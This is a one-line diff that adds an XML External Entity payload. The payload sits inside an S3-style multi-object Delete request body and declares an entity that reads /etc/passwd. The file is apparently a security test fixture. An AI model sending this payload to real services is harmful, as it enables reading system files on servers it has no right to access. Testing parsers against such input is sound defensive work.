@@ -1,0 +1,1 @@
+<!DOCTYPE Delete [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><Delete><Object><Key>&xxe;</Key></Object></Delete>
